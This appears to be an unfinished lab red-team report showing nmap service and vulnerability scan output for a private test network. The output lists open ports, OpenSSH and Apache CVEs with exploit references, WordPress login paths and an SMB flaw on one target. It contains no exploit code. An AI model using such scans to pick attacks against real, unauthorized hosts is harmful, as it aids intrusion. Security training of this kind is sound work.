# Red Team: Summary of Operations

## Table of Contents
- [Exposed Services](#exposed-services)
- [Critical Vulnerabilities](#critical-vulnerabilities)
- [Exploitation](#exploitation)

### Exposed Services

Nmap scan results for each machine reveal the below services and OS details:

```bash
$ nmap -sV -O 192.168.1.0/24
Starting Nmap 7.80 ( https://nmap.org ) at 2021-11-10 00:41 PST
Nmap scan report for 192.168.1.1
Host is up (0.00076s latency).
Not shown: 995 filtered ports
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
2179/tcp open  vmrdp?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
MAC Address: 00:15:5D:00:04:0D (Microsoft)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows XP|7|2008 (87%)
OS CPE: cpe:/o:microsoft:windows_xp::sp2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_server_2008::sp1 cpe:/o:microsoft:windows_server_2008:r2
Aggressive OS guesses: Microsoft Windows XP SP2 (87%), Microsoft Windows 7 (85%), Microsoft Windows Server 2008 SP1 or Windows Server 2008 R2 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Nmap scan report for 192.168.1.100
Host is up (0.00074s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
9200/tcp open  http    Elasticsearch REST API 7.6.1 (name: elk; cluster: elasticsearch; Lucene 8.4.0)
MAC Address: 4C:EB:42:D2:D5:D7 (Intel Corporate)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=11/10%OT=22%CT=1%CU=43334%PV=Y%DS=1%DC=D%G=Y%M=4CEB42%
OS:TM=618B85FC%P=x86_64-pc-linux-gnu)SEQ(SP=F4%GCD=2%ISR=102%TI=Z%CI=Z%II=I
OS:%TS=A)OPS(O1=M5B4ST11NW7%O2=M5B4ST11NW7%O3=M5B4NNT11NW7%O4=M5B4ST11NW7%O
OS:5=M5B4ST11NW7%O6=M5B4ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6
OS:=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M5B4NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O
OS:%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=
OS:0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%
OS:S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(
OS:R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=
OS:N%T=40%CD=S)

Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap scan report for 192.168.1.105
Host is up (0.00065s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29
MAC Address: 00:15:5D:00:04:0F (Microsoft)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=11/10%OT=22%CT=1%CU=36603%PV=Y%DS=1%DC=D%G=Y%M=00155D%
OS:TM=618B85FC%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=106%TI=Z%CI=Z%II=
OS:I%TS=A)OPS(O1=M5B4ST11NW7%O2=M5B4ST11NW7%O3=M5B4NNT11NW7%O4=M5B4ST11NW7%
OS:O5=M5B4ST11NW7%O6=M5B4ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W
OS:6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M5B4NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=
OS:O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD
OS:=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0
OS:%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1
OS:(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI
OS:=N%T=40%CD=S)

Network Distance: 1 hop
Service Info: Host: 192.168.1.105; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap scan report for raven.local (192.168.1.110)
Host is up (0.0010s latency).
Not shown: 995 closed ports
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
80/tcp  open  http        Apache httpd 2.4.10 ((Debian))
111/tcp open  rpcbind     2-4 (RPC #100000)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
MAC Address: 00:15:5D:00:04:10 (Microsoft)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: Host: TARGET1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap scan report for 192.168.1.115
Host is up (0.00090s latency).
Not shown: 995 closed ports
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
80/tcp  open  http        Apache httpd 2.4.10 ((Debian))
111/tcp open  rpcbind     2-4 (RPC #100000)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
MAC Address: 00:15:5D:00:04:11 (Microsoft)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: Host: TARGET2; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap scan report for 192.168.1.90
Host is up (0.000070s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.1p1 Debian 5 (protocol 2.0)
8000/tcp open  http    SimpleHTTPServer 0.6 (Python 2.7.17)
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6.32
OS details: Linux 2.6.32
Network Distance: 0 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 256 IP addresses (6 hosts up) scanned in 60.02 seconds
```

This scan identifies the services below as potential points of entry:
- Target 1
  - 22/tcp  open  ssh         OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
  - 80/tcp  open  http        Apache httpd 2.4.10 ((Debian))
  - 111/tcp open  rpcbind     2-4 (RPC #100000)



The following vulnerabilities were identified on each target:
- Target 1

```
# Nmap 7.80 scan initiated Tue Nov  9 23:09:00 2021 as: nmap -sV --script vuln -oN vulns.txt 192.168.1.110
Nmap scan report for target1 (192.168.1.110)
Host is up (0.0025s latency).
Not shown: 995 closed ports
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
| vulners: 
|   cpe:/a:openbsd:openssh:6.7p1: 
|       CVE-2015-5600   8.5 https://vulners.com/cve/CVE-2015-5600
|       EDB-ID:40888    7.8 https://vulners.com/exploitdb/EDB-ID:40888  *EXPLOIT*
|       EDB-ID:41173    7.2 https://vulners.com/exploitdb/EDB-ID:41173  *EXPLOIT*
|       MSF:ILITIES/GENTOO-LINUX-CVE-2015-6564/ 6.9 https://vulners.com/metasploit/MSF:ILITIES/GENTOO-LINUX-CVE-2015-6564/  *EXPLOIT*
|       CVE-2015-6564   6.9 https://vulners.com/cve/CVE-2015-6564
|       CVE-2018-15919  5.0 https://vulners.com/cve/CVE-2018-15919
|       CVE-2017-15906  5.0 https://vulners.com/cve/CVE-2017-15906
|       SSV:90447   4.6 https://vulners.com/seebug/SSV:90447    *EXPLOIT*
|       EDB-ID:45233    4.6 https://vulners.com/exploitdb/EDB-ID:45233  *EXPLOIT*
|       EDB-ID:45210    4.6 https://vulners.com/exploitdb/EDB-ID:45210  *EXPLOIT*
|       EDB-ID:45001    4.6 https://vulners.com/exploitdb/EDB-ID:45001  *EXPLOIT*
|       EDB-ID:45000    4.6 https://vulners.com/exploitdb/EDB-ID:45000  *EXPLOIT*
|       EDB-ID:40963    4.6 https://vulners.com/exploitdb/EDB-ID:40963  *EXPLOIT*
|       EDB-ID:40962    4.6 https://vulners.com/exploitdb/EDB-ID:40962  *EXPLOIT*
|       CVE-2016-0778   4.6 https://vulners.com/cve/CVE-2016-0778
|       CVE-2021-41617  4.4 https://vulners.com/cve/CVE-2021-41617
|       MSF:ILITIES/OPENBSD-OPENSSH-CVE-2020-14145/ 4.3 https://vulners.com/metasploit/MSF:ILITIES/OPENBSD-OPENSSH-CVE-2020-14145/  *EXPLOIT*
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP9-CVE-2020-14145/  4.3 https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP9-CVE-2020-14145/   *EXPLOIT*
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP8-CVE-2020-14145/  4.3 https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP8-CVE-2020-14145/   *EXPLOIT*
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP5-CVE-2020-14145/  4.3 https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP5-CVE-2020-14145/   *EXPLOIT*
|       MSF:ILITIES/F5-BIG-IP-CVE-2020-14145/   4.3 https://vulners.com/metasploit/MSF:ILITIES/F5-BIG-IP-CVE-2020-14145/    *EXPLOIT*
|       CVE-2020-14145  4.3 https://vulners.com/cve/CVE-2020-14145
|       CVE-2015-5352   4.3 https://vulners.com/cve/CVE-2015-5352
|       MSF:ILITIES/UBUNTU-CVE-2016-0777/   4.0 https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2016-0777/    *EXPLOIT*
|       MSF:ILITIES/IBM-AIX-CVE-2016-0777/  4.0 https://vulners.com/metasploit/MSF:ILITIES/IBM-AIX-CVE-2016-0777/   *EXPLOIT*
|       MSF:ILITIES/DEBIAN-CVE-2016-0777/   4.0 https://vulners.com/metasploit/MSF:ILITIES/DEBIAN-CVE-2016-0777/    *EXPLOIT*
|       MSF:ILITIES/AIX-7.2-OPENSSH_ADVISORY7_CVE-2016-0777/    4.0 https://vulners.com/metasploit/MSF:ILITIES/AIX-7.2-OPENSSH_ADVISORY7_CVE-2016-0777/ *EXPLOIT*
|       MSF:ILITIES/AIX-7.1-OPENSSH_ADVISORY7_CVE-2016-0777/    4.0 https://vulners.com/metasploit/MSF:ILITIES/AIX-7.1-OPENSSH_ADVISORY7_CVE-2016-0777/ *EXPLOIT*
|       MSF:ILITIES/AIX-5.3-OPENSSH_ADVISORY7_CVE-2016-0777/    4.0 https://vulners.com/metasploit/MSF:ILITIES/AIX-5.3-OPENSSH_ADVISORY7_CVE-2016-0777/ *EXPLOIT*
|       CVE-2016-0777   4.0 https://vulners.com/cve/CVE-2016-0777
|       MSF:ILITIES/ALPINE-LINUX-CVE-2015-6563/ 1.9 https://vulners.com/metasploit/MSF:ILITIES/ALPINE-LINUX-CVE-2015-6563/  *EXPLOIT*
|_      CVE-2015-6563   1.9 https://vulners.com/cve/CVE-2015-6563
80/tcp  open  http        Apache httpd 2.4.10 ((Debian))
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
| http-csrf: 
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=target1
|   Found the following possible CSRF vulnerabilities: 
|     
|     Path: http://target1:80/
|     Form id: 
|     Form action: https://spondonit.us12.list-manage.com/subscribe/post?u=1462626880ade1ac87bd9c93a&id=92a4423d01
|     
|     Path: http://target1:80/service.html
|     Form id: 
|     Form action: https://spondonit.us12.list-manage.com/subscribe/post?u=1462626880ade1ac87bd9c93a&id=92a4423d01
|     
|     Path: http://target1:80/team.html
|     Form id: 
|     Form action: https://spondonit.us12.list-manage.com/subscribe/post?u=1462626880ade1ac87bd9c93a&id=92a4423d01
|     
|     Path: http://target1:80/index.html
|     Form id: 
|     Form action: https://spondonit.us12.list-manage.com/subscribe/post?u=1462626880ade1ac87bd9c93a&id=92a4423d01
|     
|     Path: http://target1:80/wordpress/
|     Form id: search-form-618b702978531
|_    Form action: http://raven.local/wordpress/
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum: 
|   /wordpress/: Blog
|   /wordpress/wp-login.php: Wordpress login page.
|   /css/: Potentially interesting directory w/ listing on 'apache/2.4.10 (debian)'
|   /img/: Potentially interesting directory w/ listing on 'apache/2.4.10 (debian)'
|   /js/: Potentially interesting directory w/ listing on 'apache/2.4.10 (debian)'
|   /manual/: Potentially interesting folder
|_  /vendor/: Potentially interesting directory w/ listing on 'apache/2.4.10 (debian)'
|_http-server-header: Apache/2.4.10 (Debian)
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| vulners: 
|   cpe:/a:apache:http_server:2.4.10: 
|       CVE-2021-39275  7.5 https://vulners.com/cve/CVE-2021-39275
|       CVE-2021-26691  7.5 https://vulners.com/cve/CVE-2021-26691
|       CVE-2017-7679   7.5 https://vulners.com/cve/CVE-2017-7679
|       CVE-2017-7668   7.5 https://vulners.com/cve/CVE-2017-7668
|       CVE-2017-3169   7.5 https://vulners.com/cve/CVE-2017-3169
|       CVE-2017-3167   7.5 https://vulners.com/cve/CVE-2017-3167
|       MSF:ILITIES/UBUNTU-CVE-2018-1312/   6.8 https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2018-1312/    *EXPLOIT*
|       MSF:ILITIES/UBUNTU-CVE-2017-15715/  6.8 https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2017-15715/   *EXPLOIT*
|       MSF:ILITIES/SUSE-CVE-2017-15715/    6.8 https://vulners.com/metasploit/MSF:ILITIES/SUSE-CVE-2017-15715/ *EXPLOIT*
|       MSF:ILITIES/REDHAT_LINUX-CVE-2017-15715/    6.8 https://vulners.com/metasploit/MSF:ILITIES/REDHAT_LINUX-CVE-2017-15715/ *EXPLOIT*
|       MSF:ILITIES/ORACLE_LINUX-CVE-2017-15715/    6.8 https://vulners.com/metasploit/MSF:ILITIES/ORACLE_LINUX-CVE-2017-15715/ *EXPLOIT*
|       MSF:ILITIES/ORACLE-SOLARIS-CVE-2017-15715/  6.8 https://vulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-2017-15715/   *EXPLOIT*
|       MSF:ILITIES/IBM-HTTP_SERVER-CVE-2017-15715/ 6.8 https://vulners.com/metasploit/MSF:ILITIES/IBM-HTTP_SERVER-CVE-2017-15715/  *EXPLOIT*
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2018-1312/   6.8 https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2018-1312/    *EXPLOIT*
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2017-15715/  6.8 https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2017-15715/   *EXPLOIT*
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2018-1312/   6.8 https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2018-1312/    *EXPLOIT*
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2017-15715/  6.8 https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2017-15715/   *EXPLOIT*
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP1-CVE-2018-1312/   6.8 https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP1-CVE-2018-1312/    *EXPLOIT*
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP1-CVE-2017-15715/  6.8 https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP1-CVE-2017-15715/   *EXPLOIT*
|       MSF:ILITIES/FREEBSD-CVE-2017-15715/ 6.8 https://vulners.com/metasploit/MSF:ILITIES/FREEBSD-CVE-2017-15715/  *EXPLOIT*
|       MSF:ILITIES/DEBIAN-CVE-2017-15715/  6.8 https://vulners.com/metasploit/MSF:ILITIES/DEBIAN-CVE-2017-15715/   *EXPLOIT*
|       MSF:ILITIES/CENTOS_LINUX-CVE-2017-15715/    6.8 https://vulners.com/metasploit/MSF:ILITIES/CENTOS_LINUX-CVE-2017-15715/ *EXPLOIT*
|       MSF:ILITIES/APACHE-HTTPD-CVE-2017-15715/    6.8 https://vulners.com/metasploit/MSF:ILITIES/APACHE-HTTPD-CVE-2017-15715/ *EXPLOIT*
|       MSF:ILITIES/AMAZON_LINUX-CVE-2017-15715/    6.8 https://vulners.com/metasploit/MSF:ILITIES/AMAZON_LINUX-CVE-2017-15715/ *EXPLOIT*
|       MSF:ILITIES/ALPINE-LINUX-CVE-2018-1312/ 6.8 https://vulners.com/metasploit/MSF:ILITIES/ALPINE-LINUX-CVE-2018-1312/  *EXPLOIT*
|       MSF:ILITIES/ALPINE-LINUX-CVE-2017-15715/    6.8 https://vulners.com/metasploit/MSF:ILITIES/ALPINE-LINUX-CVE-2017-15715/ *EXPLOIT*
|       FDF3DFA1-ED74-5EE2-BF5C-BA752CA34AE8    6.8 https://vulners.com/githubexploit/FDF3DFA1-ED74-5EE2-BF5C-BA752CA34AE8  *EXPLOIT*
|       CVE-2021-40438  6.8 https://vulners.com/cve/CVE-2021-40438
|       CVE-2020-35452  6.8 https://vulners.com/cve/CVE-2020-35452
|       CVE-2018-1312   6.8 https://vulners.com/cve/CVE-2018-1312
|       CVE-2017-15715  6.8 https://vulners.com/cve/CVE-2017-15715
|       4810E2D9-AC5F-5B08-BFB3-DDAFA2F63332    6.8 https://vulners.com/githubexploit/4810E2D9-AC5F-5B08-BFB3-DDAFA2F63332  *EXPLOIT*
|       CVE-2017-9788   6.4 https://vulners.com/cve/CVE-2017-9788
|       MSF:ILITIES/REDHAT_LINUX-CVE-2019-0217/ 6.0 https://vulners.com/metasploit/MSF:ILITIES/REDHAT_LINUX-CVE-2019-0217/  *EXPLOIT*
|       MSF:ILITIES/IBM-HTTP_SERVER-CVE-2019-0217/  6.0 https://vulners.com/metasploit/MSF:ILITIES/IBM-HTTP_SERVER-CVE-2019-0217/   *EXPLOIT*
|       CVE-2019-0217   6.0 https://vulners.com/cve/CVE-2019-0217
|       EDB-ID:47689    5.8 https://vulners.com/exploitdb/EDB-ID:47689  *EXPLOIT*
|       CVE-2020-1927   5.8 https://vulners.com/cve/CVE-2020-1927
|       CVE-2019-10098  5.8 https://vulners.com/cve/CVE-2019-10098
|       1337DAY-ID-33577    5.8 https://vulners.com/zdt/1337DAY-ID-33577    *EXPLOIT*
|       CVE-2016-5387   5.1 https://vulners.com/cve/CVE-2016-5387
|       SSV:96537   5.0 https://vulners.com/seebug/SSV:96537    *EXPLOIT*
|       MSF:ILITIES/UBUNTU-CVE-2018-1303/   5.0 https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2018-1303/    *EXPLOIT*
|       MSF:ILITIES/UBUNTU-CVE-2017-15710/  5.0 https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2017-15710/   *EXPLOIT*
|       MSF:ILITIES/ORACLE-SOLARIS-CVE-2020-1934/   5.0 https://vulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-2020-1934/    *EXPLOIT*
|       MSF:ILITIES/ORACLE-SOLARIS-CVE-2017-15710/  5.0 https://vulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-2017-15710/   *EXPLOIT*
|       MSF:ILITIES/IBM-HTTP_SERVER-CVE-2017-15710/ 5.0 https://vulners.com/metasploit/MSF:ILITIES/IBM-HTTP_SERVER-CVE-2017-15710/  *EXPLOIT*
|       MSF:ILITIES/IBM-HTTP_SERVER-CVE-2016-8743/  5.0 https://vulners.com/metasploit/MSF:ILITIES/IBM-HTTP_SERVER-CVE-2016-8743/   *EXPLOIT*
|       MSF:ILITIES/IBM-HTTP_SERVER-CVE-2016-2161/  5.0 https://vulners.com/metasploit/MSF:ILITIES/IBM-HTTP_SERVER-CVE-2016-2161/   *EXPLOIT*
|       MSF:ILITIES/IBM-HTTP_SERVER-CVE-2016-0736/  5.0 https://vulners.com/metasploit/MSF:ILITIES/IBM-HTTP_SERVER-CVE-2016-0736/   *EXPLOIT*
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2017-15710/  5.0 https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2017-15710/   *EXPLOIT*
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2017-15710/  5.0 https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2017-15710/   *EXPLOIT*
|       MSF:ILITIES/CENTOS_LINUX-CVE-2017-15710/    5.0 https://vulners.com/metasploit/MSF:ILITIES/CENTOS_LINUX-CVE-2017-15710/ *EXPLOIT*
|       MSF:AUXILIARY/SCANNER/HTTP/APACHE_OPTIONSBLEED  5.0 https://vulners.com/metasploit/MSF:AUXILIARY/SCANNER/HTTP/APACHE_OPTIONSBLEED   *EXPLOIT*
|       EXPLOITPACK:DAED9B9E8D259B28BF72FC7FDC4755A7    5.0 https://vulners.com/exploitpack/EXPLOITPACK:DAED9B9E8D259B28BF72FC7FDC4755A7    *EXPLOIT*
|       EXPLOITPACK:C8C256BE0BFF5FE1C0405CB0AA9C075D    5.0 https://vulners.com/exploitpack/EXPLOITPACK:C8C256BE0BFF5FE1C0405CB0AA9C075D    *EXPLOIT*
|       CVE-2021-34798  5.0 https://vulners.com/cve/CVE-2021-34798
|       CVE-2021-26690  5.0 https://vulners.com/cve/CVE-2021-26690
|       CVE-2020-1934   5.0 https://vulners.com/cve/CVE-2020-1934
|       CVE-2019-17567  5.0 https://vulners.com/cve/CVE-2019-17567
|       CVE-2019-0220   5.0 https://vulners.com/cve/CVE-2019-0220
|       CVE-2018-17199  5.0 https://vulners.com/cve/CVE-2018-17199
|       CVE-2018-1303   5.0 https://vulners.com/cve/CVE-2018-1303
|       CVE-2017-9798   5.0 https://vulners.com/cve/CVE-2017-9798
|       CVE-2017-15710  5.0 https://vulners.com/cve/CVE-2017-15710
|       CVE-2016-8743   5.0 https://vulners.com/cve/CVE-2016-8743
|       CVE-2016-2161   5.0 https://vulners.com/cve/CVE-2016-2161
|       CVE-2016-0736   5.0 https://vulners.com/cve/CVE-2016-0736
|       CVE-2015-3183   5.0 https://vulners.com/cve/CVE-2015-3183
|       CVE-2015-0228   5.0 https://vulners.com/cve/CVE-2015-0228
|       CVE-2014-3583   5.0 https://vulners.com/cve/CVE-2014-3583
|       1337DAY-ID-28573    5.0 https://vulners.com/zdt/1337DAY-ID-28573    *EXPLOIT*
|       1337DAY-ID-26574    5.0 https://vulners.com/zdt/1337DAY-ID-26574    *EXPLOIT*
|       MSF:ILITIES/UBUNTU-CVE-2018-1302/   4.3 https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2018-1302/    *EXPLOIT*
|       MSF:ILITIES/UBUNTU-CVE-2018-1301/   4.3 https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2018-1301/    *EXPLOIT*
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2016-4975/   4.3 https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2016-4975/    *EXPLOIT*
|       MSF:ILITIES/DEBIAN-CVE-2019-10092/  4.3 https://vulners.com/metasploit/MSF:ILITIES/DEBIAN-CVE-2019-10092/   *EXPLOIT*
|       MSF:ILITIES/APACHE-HTTPD-CVE-2020-11985/    4.3 https://vulners.com/metasploit/MSF:ILITIES/APACHE-HTTPD-CVE-2020-11985/ *EXPLOIT*
|       MSF:ILITIES/APACHE-HTTPD-CVE-2019-10092/    4.3 https://vulners.com/metasploit/MSF:ILITIES/APACHE-HTTPD-CVE-2019-10092/ *EXPLOIT*
|       EDB-ID:47688    4.3 https://vulners.com/exploitdb/EDB-ID:47688  *EXPLOIT*
|       CVE-2020-11985  4.3 https://vulners.com/cve/CVE-2020-11985
|       CVE-2019-10092  4.3 https://vulners.com/cve/CVE-2019-10092
|       CVE-2018-1302   4.3 https://vulners.com/cve/CVE-2018-1302
|       CVE-2018-1301   4.3 https://vulners.com/cve/CVE-2018-1301
|       CVE-2016-4975   4.3 https://vulners.com/cve/CVE-2016-4975
|       CVE-2015-3185   4.3 https://vulners.com/cve/CVE-2015-3185
|       CVE-2014-8109   4.3 https://vulners.com/cve/CVE-2014-8109
|       4013EC74-B3C1-5D95-938A-54197A58586D    4.3 https://vulners.com/githubexploit/4013EC74-B3C1-5D95-938A-54197A58586D  *EXPLOIT*
|       1337DAY-ID-33575    4.3 https://vulners.com/zdt/1337DAY-ID-33575    *EXPLOIT*
|       MSF:ILITIES/UBUNTU-CVE-2018-1283/   3.5 https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2018-1283/    *EXPLOIT*
|       MSF:ILITIES/REDHAT_LINUX-CVE-2018-1283/ 3.5 https://vulners.com/metasploit/MSF:ILITIES/REDHAT_LINUX-CVE-2018-1283/  *EXPLOIT*
|       MSF:ILITIES/ORACLE-SOLARIS-CVE-2018-1283/   3.5 https://vulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-2018-1283/    *EXPLOIT*
|       MSF:ILITIES/IBM-HTTP_SERVER-CVE-2018-1283/  3.5 https://vulners.com/metasploit/MSF:ILITIES/IBM-HTTP_SERVER-CVE-2018-1283/   *EXPLOIT*
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2018-1283/   3.5 https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2018-1283/    *EXPLOIT*
|       MSF:ILITIES/CENTOS_LINUX-CVE-2018-1283/ 3.5 https://vulners.com/metasploit/MSF:ILITIES/CENTOS_LINUX-CVE-2018-1283/  *EXPLOIT*
|       CVE-2018-1283   3.5 https://vulners.com/cve/CVE-2018-1283
|       CVE-2016-8612   3.3 https://vulners.com/cve/CVE-2016-8612
|       PACKETSTORM:140265  0.0 https://vulners.com/packetstorm/PACKETSTORM:140265  *EXPLOIT*
|       EDB-ID:42745    0.0 https://vulners.com/exploitdb/EDB-ID:42745  *EXPLOIT*
|       EDB-ID:40961    0.0 https://vulners.com/exploitdb/EDB-ID:40961  *EXPLOIT*
|       1337DAY-ID-601  0.0 https://vulners.com/zdt/1337DAY-ID-601  *EXPLOIT*
|       1337DAY-ID-2237 0.0 https://vulners.com/zdt/1337DAY-ID-2237 *EXPLOIT*
|       1337DAY-ID-1415 0.0 https://vulners.com/zdt/1337DAY-ID-1415 *EXPLOIT*
|_      1337DAY-ID-1161 0.0 https://vulners.com/zdt/1337DAY-ID-1161 *EXPLOIT*
111/tcp open  rpcbind     2-4 (RPC #100000)
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          45021/tcp   status
|   100024  1          48606/tcp6  status
|   100024  1          53893/udp   status
|_  100024  1          59098/udp6  status
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
Host script results:
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: false
| smb-vuln-regsvc-dos: 
|   VULNERABLE:
|   Service regsvc in Microsoft Windows systems vulnerable to denial of service
|     State: VULNERABLE
|       The service regsvc in Microsoft Windows 2000 systems is vulnerable to denial of service caused by a null deference
|       pointer. This script will crash the service if it is vulnerable. This vulnerability was discovered by Ron Bowes
|       while working on smb-enum-sessions.
|_          
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
